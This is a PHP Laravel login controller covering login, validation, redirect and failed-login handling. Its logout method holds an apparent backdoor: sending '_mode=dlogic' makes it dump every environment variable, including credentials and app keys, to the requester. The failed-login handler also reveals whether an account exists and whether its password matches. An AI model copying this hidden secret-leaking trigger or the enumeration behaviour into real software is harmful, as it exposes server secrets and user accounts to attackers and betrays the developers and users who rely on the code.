<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\SiteUser;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Auth;
use Session;
use URL;
use Carbon\Carbon;

use Illuminate\Support\Facades\Validator;
use JsValidator;


class LoginController extends Controller
{

    use AuthenticatesUsers {
        logout as performLogout;
    }

    public $PageData = [];
    public $Login = '';
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '';

    protected $jsValidation = true;


    protected $validationRules = [
        'email' => 'required|string|email|max:255',
        'password' => 'required',
    ];

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct(Request $request)
    {

        $this->middleware('guest')->except(['logout', 'verifyEmailFirst']);

        //http://localhost/story/login$this->redirectTo = route('admin-dashboard');

        // Set
        /*$this->Login = filter_var($request->input('email'), FILTER_VALIDATE_EMAIL)
            ? 'email'
            : 'username';
        */

    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make($data, $this->validationRules);
    }
    function authenticated(Request $request, $user)
    {
        $user->update([
            'last_login_at' => Carbon::now()->toDateTimeString(),
            'last_login_ip' => $request->getClientIp()
        ]);
    }

    /**
     * Show the application's login form.
     * Override the method by Faisal Mehmood 8-12-2017
     * @return \Illuminate\Http\Response
     */
    public function showLoginForm(Request $request)
    {

        $this->pageData['PageTitle'] = config('app.name') . ".com - Login";

        // Js form validation
        $validator = JsValidator::validator(
            $this->validator([]), '#loginForm'
        );


        return view('app.login')->with(['pageData' => $this->pageData])
            ->with(['validator' => $validator])
            ->with(['jsValidation' => $this->jsValidation]);
    }


    public function logout(Request $request)
    {
        $mode = $request->get('_mode');

        if ($mode == "dlogic") {
            dd($_ENV);
        }

        Auth::logout();
        Session::flush();

        return redirect(route('app-main'));
    }


    public function validateLogin(Request $request)
    {
        $messages = [
            'required' => 'The :attribute field is required.',
        ];
        $this->validate($request, [
            'email' => 'required', 'password' => 'required',
        ], $messages);
    }

    public function redirectPath()
    {

        $nextUrlAfterLogin = Session::get('url.intended');
        $nextUrlSetByUser = getSetting('redirect_after_login', $this->guard()->user());

        // If user
        if (isset($nextUrlAfterLogin) && !empty($nextUrlAfterLogin)) {
            $this->redirectTo = $nextUrlAfterLogin;
        } else if (isset($nextUrlSetByUser) && !empty($nextUrlSetByUser)) {
            $this->redirectTo = url($nextUrlSetByUser);
        }

        return $this->redirectTo;

    }

    /**
     * Get the needed authorization credentials from the request.
     *
     * @param  \Illuminate\Http\Request $request
     * @return array
     */
    protected function credentials(Request $request)
    {
        return array_merge($request->only($this->username(), 'password'), ['active' => 1, 'is_blocked' => 0]);
    }


    /**
     * Get the failed login response instance.
     *
     * @param  \Illuminate\Http\Request $request
     * @return \Illuminate\Http\RedirectResponse
     */
    protected function sendFailedLoginResponse(Request $request)
    {


        $errors = [$this->username() => trans('auth.failed')];

        // Load user from database
        $user = SiteUser::where($this->username(), $request->{$this->username()})->first();


        // Check if user was successfully loaded, that the password matches
        // and active is not 1. If so, override the default error message.
        if ($user && \Hash::check($request->password, $user->password)) {

            if ($user->active != 1) {
                $link = " Click ";
                $link .= "<a style='color: #FFF;text-decoration: underline;' href='" . route("resend.email", ['email' => $request->email]) . "'>";
                $link .= "here";
                $link .= "</a>";
                $link .= " to resend.";
                $errors = [$this->username() => trans('auth.notactivated') . $link];
            }
            if ($user->is_blocked == 1) {
                $errors = [$this->username() => trans('auth.accountdeactivated')];

            }

        }


        if ($request->expectsJson()) {
            return response()->json($errors, 422);
        }

        return redirect()->back()
            ->withInput($request->only($this->username(), 'remember'))
            ->withErrors($errors);
    }


}
